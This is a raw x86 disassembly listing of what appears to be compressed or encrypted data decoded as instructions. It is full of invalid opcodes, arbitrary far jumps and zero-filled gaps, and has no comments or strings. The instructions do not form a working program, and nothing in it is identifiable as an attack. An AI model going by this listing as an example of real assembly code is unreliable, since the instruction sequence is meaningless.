  41be0f:	rol    BYTE PTR ds:0x0,cl
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x7056c09a]
  41be82:	dec    ebp
  41be83:	and    eax,DWORD PTR [ebp+0x5000128]
  41be89:	add    DWORD PTR [eax],eax
  41be8b:	add    BYTE PTR [eax],bh
  41be8d:	test   al,0x1b
  41be8f:	mov    esi,0x41f383be
  41be94:	popf   
  41be95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be96:	inc    esi
  41be97:	push   ds
  41be98:	call   0xe36f:0x5ff49a66
  41be9f:	mov    dh,0xcb
  41bea1:	pop    ds
  41bea2:	xor    BYTE PTR [esi],ah
  41bea4:	mov    ebp,0x3309c3fe
  41bea9:	cmp    ah,BYTE PTR [edx]
  41beab:	(bad)  
  41beac:	call   0x2e04631b
  41beb1:	dec    esi
  41beb2:	adc    BYTE PTR [ebp+0x694084f2],0xc8
  41beb9:	mov    ah,0x6a
  41bebb:	(bad)  
  41bebc:	mov    ebx,0x36aaf41c
  41bec1:	push   edi
  41bec2:	les    esi,FWORD PTR [edx+esi*4]
  41bec5:	mov    edx,0x34579a6e
  41beca:	test   eax,0xc2559b33
  41becf:	jmp    0x3d5b:0xcfe48e1
  41bed6:	stos   BYTE PTR es:[edi],al
  41bed7:	jecxz  0x41becf
  41bed9:	jle    0x41bec5
  41bedb:	nop
  41bedc:	(bad)  [eax]
  41bede:	cmp    DWORD PTR [ebp-0x29db08c],0x54
  41bee5:	ja     0x41bed0
  41bee7:	fsub   DWORD PTR [ebx+0x78]
  41beea:	mov    cs,WORD PTR [eax]
  41beec:	sbb    al,0x3c
  41beee:	xor    DWORD PTR [esi+0x21b4b410],esi
  41bef4:	enter  0x173c,0x67
  41bef8:	xchg   esp,eax
  41bef9:	cmp    eax,0x196aa8fb
  41befe:	hlt    
  41beff:	lods   eax,DWORD PTR ds:[esi]
  41bf00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf01:	push   esp
  41bf02:	dec    ebx
  41bf03:	(bad)  
  41bf04:	mov    edi,0x8c968830
  41bf09:	and    DWORD PTR fs:[esi-0x4ab3484c],0x24
  41bf11:	stos   BYTE PTR es:[di],al
  41bf13:	fwait
  41bf14:	cwde   
  41bf15:	mov    eax,0x1d58b8c7
  41bf1a:	or     eax,0x8b5b113f
  41bf1f:	fistp  QWORD PTR [esi+eiz*1]
  41bf22:	push   edi
  41bf23:	xchg   BYTE PTR [ebx+0x61],dl
  41bf26:	pop    ebx
  41bf27:	dec    eax
  41bf28:	xchg   ebp,eax
  41bf29:	in     eax,dx
  41bf2a:	and    eax,0xc964edc4
  41bf2f:	enter  0x3c84,0x6e
  41bf33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf34:	fild   WORD PTR [ecx-0x791e78e8]
  41bf3a:	pop    es
  41bf3b:	pusha  
  41bf3c:	xor    eax,edi
  41bf3e:	jno    0x41bf54
  41bf40:	sbb    al,0xae
  41bf42:	jmp    0xae71:0x3074bf19
  41bf49:	daa    
  41bf4a:	dec    esi
  41bf4b:	xor    edx,DWORD PTR [edi+0x298c62e4]
  41bf51:	int    0xf5
  41bf53:	ret    0x4d33
  41bf56:	call   0x8d861f0c
  41bf5b:	mov    ebp,0xea52d91b
  41bf60:	adc    eax,0xcc7e99d6
  41bf65:	mov    ds:0xb1f2e3eb,al
  41bf6a:	jge    0x41bf01
  41bf6c:	(bad)  [ebp-0x10]
  41bf6f:	mov    DWORD PTR [eax-0x6f661c1e],ebp
  41bf75:	jle    0x41bf62
  41bf77:	repnz scas al,BYTE PTR es:[edi]
  41bf79:	mov    esp,0x6140c476
  41bf7e:	repnz pop esp
  41bf80:	xchg   BYTE PTR [edx-0x10],dl
  41bf83:	mov    ds:0x1862cbc0,al
  41bf88:	(bad)  
  41bf89:	ficomp WORD PTR [ecx]
  41bf8b:	fcomp  st(5)
  41bf8d:	aam    0xb5
  41bf8f:	or     cl,ah
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	push   ebx
  41c001:	popa   
  41c002:	cmc    
  41c003:	stos   DWORD PTR es:[edi],eax
  41c004:	mov    ch,BYTE PTR [ecx]
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    eax,0x37000001
  41c00d:	mov    ebx,0x2f289254
  41c012:	icebp  
  41c013:	or     eax,0x3b8850c9
  41c018:	dec    esi
  41c019:	push   edx
  41c01a:	xchg   ebp,eax
  41c01b:	adc    al,0x73
  41c01d:	sahf   
  41c01e:	mov    cs,ebp
  41c020:	or     edi,DWORD PTR [esi+0x3]
  41c023:	push   es
  41c024:	(bad)  
  41c026:	inc    ebp
  41c027:	cmp    al,0x15
  41c029:	inc    esi
  41c02a:	jnp    0x41bfc6
  41c02c:	inc    edx
  41c02d:	sbb    BYTE PTR [ebx],dl
  41c02f:	call   0x899f:0x1ba8e22e
  41c036:	fwait
  41c037:	out    0xc9,eax
  41c039:	xchg   ebp,eax
  41c03a:	fisttp DWORD PTR [eax+0x15]
  41c03d:	push   0xffffff97
  41c03f:	retf   
  41c040:	shl    DWORD PTR [edi],1
  41c042:	imul   ebx,DWORD PTR [esi+0x6c],0xf9ddefee
  41c049:	call   0xca82f0c7
  41c04e:	loope  0x41c0cc
  41c050:	xchg   ebx,eax
  41c051:	stc    
  41c052:	jg     0x41c099
  41c054:	xchg   ebp,eax
  41c055:	xor    BYTE PTR [edx],cl
  41c057:	and    eax,0xb0f26750
  41c05c:	lods   al,BYTE PTR ds:[esi]
  41c05d:	add    eax,0xdcdec64d
  41c062:	xchg   esi,eax
  41c063:	inc    esi
  41c064:	(bad)  
  41c065:	paddd  mm7,mm1
  41c068:	pop    esi
  41c069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c06a:	scas   eax,DWORD PTR es:[edi]
  41c06b:	sbb    BYTE PTR [eax+0x37],0x3d
  41c06f:	push   edi
  41c070:	mov    WORD PTR [edx+0x17],es
  41c073:	mov    bh,0xef
  41c075:	mov    DWORD PTR [esi+ebx*2+0x21fa728d],ebx
  41c07c:	mov    al,0x4b
  41c07e:	fisubr DWORD PTR [edx+0x2025715]
  41c084:	mov    eax,0x728c5306
  41c089:	sahf   
  41c08a:	lods   al,BYTE PTR ds:[esi]
  41c08b:	sub    BYTE PTR [ebp-0x34ec1047],cl
  41c091:	(bad)  
  41c092:	in     al,dx
  41c093:	jecxz  0x41c0a7
  41c095:	repz in eax,0xf9
  41c098:	add    edi,DWORD PTR [edi-0x7e]
  41c09b:	cmp    DWORD PTR [ecx+0x110a781d],ecx
  41c0a1:	pusha  
  41c0a2:	jecxz  0x41c0a2
  41c0a4:	out    dx,al
  41c0a5:	clc    
  41c0a6:	retf   0xd149
  41c0a9:	imul   esi,eax,0xfffffff0
  41c0ac:	addr16 xchg ebx,eax
  41c0ae:	xor    ch,BYTE PTR [edx+0x1c]
  41c0b1:	and    edi,DWORD PTR [ecx+ebx*8+0x16]
  41c0b5:	mov    dh,0xbd
  41c0b7:	mov    esi,edx
  41c0b9:	inc    esp
  41c0ba:	pop    ebx
  41c0bb:	cli    
  41c0bc:	or     DWORD PTR [eax+0x18c8a444],ebx
  41c0c2:	mov    ?,edx
  41c0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0c5:	xor    DWORD PTR [edi-0x63],ecx
  41c0c8:	push   edx
  41c0c9:	call   0xc04f:0xe81b6e3f
  41c0d0:	jo     0x41c085
  41c0d2:	gs or  al,0xdf
  41c0d5:	dec    ebp
  41c0d6:	shl    DWORD PTR [esi],0x6b
  41c0d9:	pop    ecx
  41c0da:	jg     0x41c081
  41c0dc:	push   0xffffffaa
  41c0de:	push   cs
  41c0df:	test   eax,0xde8881b3
  41c0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0e5:	jle    0x41c109
  41c0e7:	out    dx,al
  41c0e8:	in     al,dx
  41c0e9:	cmp    DWORD PTR [ebx],ebx
  41c0eb:	sbb    edx,0xd6596e21
  41c0f1:	icebp  
  41c0f2:	cdq    
  41c0f3:	repnz push ss
  41c0f5:	es test eax,0x871fadae
  41c0fb:	sub    eax,esi
  41c0fd:	inc    ecx
  41c0fe:	imul   ecx,eax,0x1cac5eaf
  41c104:	call   0xe05c6571
  41c109:	pushf  
  41c10a:	imul   ebp,ebx,0xa
  41c10d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c10e:	mov    ch,0xdb
  41c110:	rol    DWORD PTR [eax],cl
	...
  41c172:	add    BYTE PTR [eax],al
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x967885e9,eax
  41c183:	push   esi
  41c184:	(bad)
  41c188:	add    eax,0x34000001
  41c18d:	dec    esp
  41c18e:	in     eax,dx
  41c18f:	cs repnz retf 
  41c192:	stc    
  41c193:	daa    
  41c194:	dec    ebp
  41c195:	out    dx,eax
  41c196:	fwait
  41c197:	test   BYTE PTR [esi],al
  41c199:	fisubr DWORD PTR [edx+0x7113bc9c]
  41c19f:	xchg   BYTE PTR [esi],bl
  41c1a1:	mov    edi,0x42a7d23b
  41c1a6:	pop    edi
  41c1a7:	sub    DWORD PTR [ebx],0x67
  41c1aa:	fwait
  41c1ab:	mov    DWORD PTR [eax],ebx
  41c1ad:	popa   
  41c1ae:	fidivr WORD PTR [esi-0x63]
  41c1b1:	inc    esp
  41c1b2:	loope  0x41c1df
  41c1b4:	sub    al,ch
  41c1b6:	sbb    BYTE PTR [edx-0x3f06b37e],ah
  41c1bc:	lea    ecx,[esi]
  41c1be:	leave  
  41c1bf:	dec    edx
  41c1c0:	xor    ebp,DWORD PTR [esi]
  41c1c2:	call   DWORD PTR [esi-0x51f250c4]
  41c1c8:	or     ebp,edi
  41c1ca:	shr    DWORD PTR ds:0x1cc8f89,0xcd
  41c1d1:	(bad)  
  41c1d2:	sar    BYTE PTR [edx],1
  41c1d4:	stos   BYTE PTR es:[edi],al
  41c1d5:	pusha  
  41c1d6:	sub    eax,0x4261a0af
  41c1db:	cmp    ch,BYTE PTR [esi+0x10]
  41c1de:	or     al,0x4a
  41c1e0:	jge    0x41c17d
  41c1e2:	ja     0x41c208
  41c1e4:	ds sub al,0xbd
  41c1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1e8:	sar    edx,0x71
  41c1eb:	inc    ebp
  41c1ec:	lea    esp,[edi+0x40]
  41c1ef:	dec    edi
  41c1f0:	fmul   DWORD PTR [edi-0x9df569e]
  41c1f6:	sub    eax,0xa0df60cb
  41c1fb:	and    esp,DWORD PTR [edx+0x79]
  41c1fe:	cmc    
  41c1ff:	xor    DWORD PTR [edx+0x2a],edx
  41c202:	test   BYTE PTR [ebp-0x2b0da22d],dl
  41c208:	loop   0x41c22d
  41c20a:	add    ebx,edx
  41c20c:	retf   
  41c20d:	jp     0x41c190
  41c20f:	adc    esi,DWORD PTR [ebx+0x29a77682]
  41c215:	cli    
  41c216:	dec    esi
  41c217:	mov    edx,0x7157541a
  41c21c:	retf   
  41c21d:	lods   eax,DWORD PTR ds:[esi]
  41c21e:	push   esi
  41c21f:	adc    esi,DWORD PTR [edx-0x25]
  41c222:	test   BYTE PTR [eax+0x64ac5cbb],0xe8
  41c229:	ffreep st(7)
  41c22b:	and    BYTE PTR [edx+0x1169eae6],ch
  41c231:	mov    ah,0x9d
  41c233:	repz mov edx,0xc7a36d76
  41c239:	mov    dl,0xfc
  41c23b:	outs   dx,DWORD PTR ds:[esi]
  41c23c:	shl    BYTE PTR [esi],cl
  41c23e:	dec    ebp
  41c23f:	jns    0x41c1dc
  41c241:	repz xor ecx,DWORD PTR [edx]
  41c244:	xchg   edi,eax
  41c245:	or     BYTE PTR [edi],dh
  41c247:	mov    edx,0x3bcd56f8
  41c24c:	dec    ebx
  41c24d:	or     DWORD PTR [edx+edx*1],edi
  41c250:	daa    
  41c251:	ins    DWORD PTR es:[edi],dx
  41c252:	sbb    cl,cl
  41c254:	cdq    
  41c255:	dec    eax
  41c256:	dec    ecx
  41c257:	jne    0x41c1f2
  41c259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c25a:	pop    ebp
  41c25b:	mov    bl,0x17
  41c25d:	out    0xc2,al
  41c25f:	adc    ebp,esi
  41c261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c262:	fstp   QWORD PTR [esi-0x5e]
  41c265:	ror    BYTE PTR [edi-0x135f0c39],1
  41c26b:	repnz icebp 
  41c26d:	push   ds
  41c26e:	pop    edi
  41c26f:	push   ebx
  41c270:	or     dh,BYTE PTR [ecx]
  41c272:	loope  0x41c23a
  41c274:	call   0xa0381015
  41c279:	mov    cl,BYTE PTR [edx]
  41c27b:	addr16 mov eax,ds:0xb69b
  41c27f:	xor    BYTE PTR [edi+0x4d],dh
  41c282:	inc    eax
  41c283:	stos   BYTE PTR es:[edi],al
  41c284:	jecxz  0x41c2f6
  41c286:	mov    WORD PTR [esi-0x15],ss
  41c289:	or     BYTE PTR [esi-0x7e],dh
  41c28c:	cld    
  41c28d:	jne    0x41c2ad
  41c28f:	push   edi
  41c290:	add    al,0x0
	...
  41c2f2:	add    BYTE PTR [eax],al
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	repnz aas 
  41c302:	stos   DWORD PTR es:[edi],eax
  41c303:	test   eax,0x12b94
  41c308:	add    eax,0xa9000001
  41c30d:	mov    al,ds:0x851b436
  41c312:	enter  0xb484,0xd4
  41c316:	dec    esi
  41c317:	mov    cl,0xe0
  41c319:	adc    ch,bh
  41c31b:	test   al,0x86
  41c31d:	cs sub al,0xdf
  41c320:	pushf  
  41c321:	mov    al,ch
  41c323:	push   ss
  41c324:	mov    WORD PTR ss:[edi+ecx*1+0x58],?
  41c329:	push   eax
  41c32a:	lds    edx,FWORD PTR [ecx+ebp*4-0x44]
  41c32e:	pushf  
  41c32f:	shl    DWORD PTR [ecx+esi*4],0x1e
  41c333:	push   cs
  41c334:	and    esi,DWORD PTR [ebp+ebx*1+0x6c2b3425]
  41c33b:	std    
  41c33c:	xchg   esp,eax
  41c33d:	xor    DWORD PTR [ecx],ebp
  41c33f:	dec    edx
  41c340:	aad    0xd1
  41c342:	daa    
  41c343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c344:	ret    
  41c345:	sbb    BYTE PTR [esi+0x6a],dh
  41c348:	xor    BYTE PTR [ebx-0x7022ee6f],ch
  41c34e:	sub    eax,0xfd193a18
  41c353:	xchg   ecx,eax
  41c354:	mul    BYTE PTR [edi-0x2fddf8c0]
  41c35a:	dec    esi
  41c35b:	push   esp
  41c35c:	jbe    0x41c30d
  41c35e:	scas   eax,DWORD PTR es:[edi]
  41c35f:	mov    ecx,0x76887406
  41c364:	push   edi
  41c365:	xchg   BYTE PTR [ebp+0x4d324d99],al
  41c36b:	test   eax,0x7d29e25d
  41c370:	(bad)  
  41c371:	mov    dl,0x60
  41c373:	add    dh,cl
  41c375:	adc    BYTE PTR [esi-0x7c],bh
  41c378:	pop    ebx
  41c379:	bnd jg 0x41c364
  41c37c:	jno    0x41c3b9
  41c37e:	sbb    edx,DWORD PTR [edi]
  41c380:	mov    dl,bh
  41c382:	aaa    
  41c383:	mov    ds:0x9b94769b,al
  41c388:	lea    ebp,[ebp+ebp*8+0x73a31b68]
  41c38f:	push   ebp
  41c390:	push   ss
  41c391:	sbb    BYTE PTR [ebx],dh
  41c393:	mov    ebx,0xcb7885e5
  41c398:	jge    0x41c3c4
  41c39a:	sbb    BYTE PTR [ebp+0x38],dl
  41c39d:	cld    
  41c39e:	xor    DWORD PTR [edi-0x1f],edx
  41c3a1:	gs push edx
  41c3a3:	jle    0x41c3ac
  41c3a5:	mov    dh,0xa0
  41c3a7:	je     0x41c3bb
  41c3a9:	push   ebx
  41c3aa:	lock dec ebx
  41c3ac:	xor    eax,0x697c5c93
  41c3b1:	mov    edi,0xb7b382dc
  41c3b6:	xchg   esp,eax
  41c3b7:	sbb    al,0x96
  41c3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ba:	lock (bad) 
  41c3bc:	dec    ecx
  41c3bd:	loope  0x41c38e
  41c3bf:	adc    DWORD PTR [ecx+0xd],edi
  41c3c2:	sbb    eax,0x361443ea
  41c3c7:	stos   DWORD PTR es:[edi],eax
  41c3c8:	aaa    
  41c3c9:	shr    al,0x6c
  41c3cc:	cmp    esp,DWORD PTR [edi+eax*8-0x52]
  41c3d0:	sub    ebp,ebp
  41c3d2:	leave  
  41c3d3:	js     0x41c3bc
  41c3d5:	pop    es
  41c3d6:	adc    DWORD PTR [edx-0x195f4c89],ebx
  41c3dc:	fwait
  41c3dd:	mov    ds:0x37eaf5eb,eax
  41c3e2:	add    ax,bx
  41c3e5:	jmp    0xea54f1af
  41c3ea:	sub    ebx,DWORD PTR ds:0x3bafb6f3
  41c3f0:	ret    0xacc9
  41c3f3:	enter  0xbc3c,0xeb
  41c3f7:	mov    ch,0x88
  41c3f9:	xor    BYTE PTR [eax-0x28],0x73
  41c3fd:	xchg   ebp,eax
  41c3fe:	mov    ebx,0xe24c8fa6
  41c403:	bound  edi,QWORD PTR [ebp-0x5b6c7c47]
  41c409:	sbb    al,0xfa
  41c40b:	(bad)  [eax+edx*8]
  41c40e:	shr    bh,0x48
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	ins    DWORD PTR es:[edi],dx
  41c481:	hlt    
  41c482:	fdivr  QWORD PTR [ecx+ebx*4+0x500012c]
  41c489:	add    DWORD PTR [eax],eax
  41c48b:	add    BYTE PTR [edx-0x63a9ced9],ch
  41c491:	sbb    bh,BYTE PTR [edx+0x2]
  41c494:	or     al,0xa3
  41c496:	sub    BYTE PTR [ecx+0x5d],dl
  41c499:	(bad)  
  41c49b:	and    DWORD PTR [eax],edi
  41c49d:	and    eax,0xeb9e729e
  41c4a2:	sbb    al,0x27
  41c4a4:	fpatan 
  41c4a6:	mov    ah,0x15
  41c4a8:	sbb    dh,al
  41c4aa:	mov    WORD PTR [eax-0x68],gs
  41c4ad:	(bad)  fs:[eax+0x1b1dcc53]
  41c4b4:	cld    
  41c4b5:	pop    es
  41c4b6:	dec    ebx
  41c4b7:	mov    ?,ebp
  41c4b9:	(bad)  
  41c4ba:	jmp    0x479:0x3fae70c1
  41c4c1:	pop    ebp
  41c4c2:	cmp    eax,0xb33f2386
  41c4c7:	mov    al,ds:0x58e67d94
  41c4cc:	(bad)  
  41c4cd:	sbb    al,0x76
  41c4cf:	std    
  41c4d0:	jge    0x41c452
  41c4d2:	cmp    edi,DWORD PTR [eax+ebp*4]
  41c4d5:	dec    edx
  41c4d6:	or     bl,bl
  41c4d8:	pop    ds
  41c4d9:	mov    ecx,0xfbf52fea
  41c4de:	bound  ebx,QWORD PTR [edi+0xf]
  41c4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e2:	mov    bh,ch
  41c4e4:	push   edx
  41c4e5:	scas   al,BYTE PTR es:[edi]
  41c4e6:	fldcw  WORD PTR [ecx+eax*1-0x1c]
  41c4ea:	imul   edx,DWORD PTR [eax+0x53],0x32
  41c4ee:	(bad)  
  41c4ef:	xor    al,0xaa
  41c4f1:	xchg   edi,eax
  41c4f2:	in     eax,dx
  41c4f3:	mov    esp,0x6499eba7
  41c4f8:	jo     0x41c52d
  41c4fa:	push   ss
  41c4fb:	daa    
  41c4fc:	jmp    0xb696:0xcc274fdc
  41c503:	push   0xffffff9b
  41c505:	jnp    0x41c51e
  41c507:	int    0x71
  41c509:	lock fbld TBYTE PTR [edi+0x5d]
  41c50d:	sbb    DWORD PTR [ebx+ebp*4],eax
  41c510:	ret    
  41c511:	mov    BYTE PTR [ecx],bl
  41c513:	cdq    
  41c514:	sti    
  41c515:	mov    bh,0xf
  41c517:	jns    0x41c592
  41c519:	push   ds
  41c51a:	jmp    0x14f5015e
  41c51f:	mov    edx,0x5ca3481
  41c524:	pop    esi
  41c525:	aaa    
  41c526:	mov    ebx,0xe70d1af
  41c52b:	inc    ecx
  41c52c:	lods   al,BYTE PTR ds:[esi]
  41c52d:	arpl   bp,si
  41c52f:	jb     0x41c4db
  41c531:	les    edx,FWORD PTR [edx]
  41c533:	inc    edx
  41c534:	stos   BYTE PTR es:[edi],al
  41c535:	and    esp,DWORD PTR [ebx-0x66c1e353]
  41c53b:	inc    esi
  41c53c:	jne    0x41c4f3
  41c53e:	cmp    DWORD PTR [edx],edx
  41c540:	xor    DWORD PTR [edi],edi
  41c542:	out    0xf,al
  41c544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c545:	lahf   
  41c546:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41c548:	sub    ah,BYTE PTR [ecx]
  41c54a:	out    dx,al
  41c54b:	mov    cl,0x7a
  41c54d:	dec    ebp
  41c54e:	or     ebp,DWORD PTR [edi+0x3a]
  41c551:	in     eax,0x8a
  41c553:	popf   
  41c554:	dec    eax
  41c555:	jne    0x41c503
  41c557:	dec    esi
  41c558:	xor    BYTE PTR [ebx+0x1e66ce21],bl
  41c55e:	add    DWORD PTR [edx],eax
  41c560:	mov    es,WORD PTR [ecx]
  41c562:	out    0x5e,eax
  41c564:	pop    esp
  41c565:	and    al,0x7b
  41c567:	std    
  41c568:	or     ebx,DWORD PTR [ebp-0x40]
  41c56b:	js     0x41c54c
  41c56d:	bound  edi,QWORD PTR [eax+0x78049883]
  41c573:	bound  edi,QWORD PTR [edi+0x4]
  41c576:	out    dx,al
  41c577:	outs   dx,DWORD PTR ds:[esi]
  41c578:	add    ch,BYTE PTR [edi+0x42]
  41c57b:	jle    0x41c5ec
  41c57d:	lods   eax,DWORD PTR ds:[esi]
  41c57e:	mov    bl,0xc
  41c580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c581:	jmp    0xed16:0x9ae49bd6
  41c588:	dec    eax
  41c589:	cwde   
  41c58a:	dec    edi
  41c58b:	das    
  41c58c:	retf   
  41c58d:	or     eax,0x18b750
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x780308de
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0xc2000001
  41c60d:	mov    ecx,0x36c28e98
  41c612:	cmp    ebp,DWORD PTR [ebx-0x2e29e602]
  41c618:	xor    eax,0x6080af85
  41c61d:	adc    al,0xbb
  41c61f:	stos   BYTE PTR es:[edi],al
  41c620:	and    DWORD PTR [esi],0xaf859853
  41c626:	inc    esi
  41c627:	jno    0x41c619
  41c629:	xchg   ebx,eax
  41c62a:	bound  ebx,QWORD PTR [edx-0x6f7649b0]
  41c630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c631:	out    0xa2,eax
  41c633:	fisub  DWORD PTR [edx+0x22]
  41c636:	dec    esi
  41c637:	es pusha 
  41c639:	lods   eax,DWORD PTR ds:[si]
  41c63b:	xchg   DWORD PTR [esi-0x23],ecx
  41c63e:	fcmove st,st(3)
  41c640:	jge    0x41c66f
  41c642:	mov    dh,0xe4
  41c644:	lods   eax,DWORD PTR ds:[esi]
  41c645:	sahf   
  41c646:	sbb    BYTE PTR [eax+0x3d],cl
  41c649:	push   ss
  41c64a:	and    eax,0x8af5b2fa
  41c64f:	retf   
  41c650:	jl     0x41c6cb
  41c652:	mov    eax,DWORD PTR [edi]
  41c654:	push   0xffffffb8
  41c656:	cmp    eax,0x63df7fa9
  41c65b:	push   ss
  41c65c:	test   al,0xb5
  41c65e:	rcr    DWORD PTR [eax+0x6f],0xf5
  41c662:	gs sbb al,0xbb
  41c665:	ret    
  41c666:	cli    
  41c667:	test   BYTE PTR [edx],0xa5
  41c66a:	mov    ah,0xb6
  41c66c:	lods   al,BYTE PTR ds:[esi]
  41c66d:	mov    dl,0x7
  41c66f:	mov    ecx,0xe0534851
  41c674:	cmp    bh,BYTE PTR [eax+0x21]
  41c677:	cmp    edi,DWORD PTR es:[esp+edi*1+0x5e]
  41c67c:	rcr    DWORD PTR [ecx+0x5af92d96],cl
  41c682:	(bad)  
  41c683:	fwait
  41c684:	mov    WORD PTR [ebx],fs
  41c686:	ret    
  41c687:	rol    BYTE PTR [edi-0x40dab113],cl
  41c68d:	jle    0x41c63e
  41c68f:	and    BYTE PTR [ebx],dh
  41c691:	bnd ja 0x41c6d3
  41c694:	icebp  
  41c695:	or     ch,BYTE PTR cs:[ebx+edx*4]
  41c699:	jle    0x41c6c5
  41c69b:	pop    ss
  41c69c:	push   ss
  41c69d:	nop
  41c69e:	push   edx
  41c69f:	imul   ebp,DWORD PTR [edx+0x414e4bba],0x42
  41c6a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6a7:	and    BYTE PTR [eax],0xb1
  41c6aa:	mov    esp,DWORD PTR [edi+0x577daa52]
  41c6b0:	push   eax
  41c6b1:	mov    eax,ds:0x77a5ff65
  41c6b6:	dec    esp
  41c6b7:	mov    ecx,0x2d6666d5
  41c6bc:	outs   dx,BYTE PTR ds:[esi]
  41c6bd:	repz (bad) 
  41c6bf:	repnz push ecx
  41c6c1:	push   ebx
  41c6c2:	dec    ecx
  41c6c3:	ret    
  41c6c4:	mov    ds:0x3a4761ef,eax
  41c6c9:	mov    eax,0x49bdce3a
  41c6ce:	repz and al,0xad
  41c6d1:	sub    al,0x87
  41c6d3:	push   0x38e8f87c
  41c6d8:	out    dx,al
  41c6d9:	add    ch,BYTE PTR [ecx-0x28b04e0b]
  41c6df:	jns    0x41c6d5
  41c6e1:	pushf  
  41c6e2:	repnz sub DWORD PTR [ebx-0x8],ebx
  41c6e6:	jno    0x41c6d7
  41c6e8:	cmp    eax,DWORD PTR [ecx]
  41c6ea:	dec    esp
  41c6eb:	cdq    
  41c6ec:	cwde   
  41c6ed:	test   al,0x92
  41c6ef:	or     al,0xa6
  41c6f1:	repnz imul ebx,eax,0xa
  41c6f5:	and    BYTE PTR [ebx+0x34],dl
  41c6f8:	adc    al,0xce
  41c6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fb:	or     al,0xf1
  41c6fd:	cmp    cl,BYTE PTR [ebp-0x27]
  41c700:	adc    eax,0xc68fddd3
  41c705:	js     0x41c702
  41c707:	sub    DWORD PTR [eax+eax*4-0x9],esi
  41c70b:	jmp    0x9a:0x5b1446dc
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	mov    edx,DWORD PTR [ebp+0x2ea34888]
  41c786:	add    DWORD PTR [eax],eax
  41c788:	add    eax,0x5000001
  41c78d:	data16 mov al,ds:0xd8070056
  41c793:	pop    ebp
  41c794:	pop    esi
  41c795:	test   eax,0x911dbced
  41c79a:	jge    0x41c7d9
  41c79c:	addr16 push 0xffffffcd
  41c79f:	iret   
  41c7a0:	(bad)  
  41c7a1:	jl     0x41c81c
  41c7a3:	mov    ds:0x17cd3146,al
  41c7a8:	(bad)  
  41c7a9:	dec    ebx
  41c7aa:	mov    ah,0xda
  41c7ac:	in     eax,dx
  41c7ad:	pop    edi
  41c7ae:	gs ins BYTE PTR es:[edi],dx
  41c7b0:	int    0x23
  41c7b2:	cmc    
  41c7b3:	mov    bl,BYTE PTR [esi]
  41c7b5:	jne    0x41c808
  41c7b7:	mov    ds:0xf8a36ff3,al
  41c7bc:	mov    dh,BYTE PTR [edi]
  41c7be:	pop    eax
  41c7bf:	jg     0x41c833
  41c7c1:	or     eax,0x4ac07c58
  41c7c6:	test   cl,dh
  41c7c8:	jno    0x41c7d8
  41c7ca:	mov    edi,0x43740df9
  41c7cf:	or     edi,DWORD PTR [esi]
  41c7d1:	pop    esi
  41c7d2:	imul   bl
  41c7d4:	int    0x5b
  41c7d6:	inc    esi
  41c7d7:	push   ebx
  41c7d8:	mov    WORD PTR [ebp+0x75],ds
  41c7db:	push   0x347e2e20
  41c7e0:	push   ebx
  41c7e1:	ss mov fs,ecx
  41c7e4:	add    cl,cl
  41c7e6:	mov    ds:0xee6653ed,al
  41c7eb:	and    al,0x66
  41c7ed:	inc    edx
  41c7ee:	enter  0xb068,0xe1
  41c7f2:	mov    WORD PTR [eax],ds
  41c7f4:	pop    edx
  41c7f5:	aam    0xbf
  41c7f7:	mov    ebx,DWORD PTR [edi+0x3473dd67]
  41c7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7fe:	in     eax,dx
  41c7ff:	retf   0xd59e
  41c802:	popa   
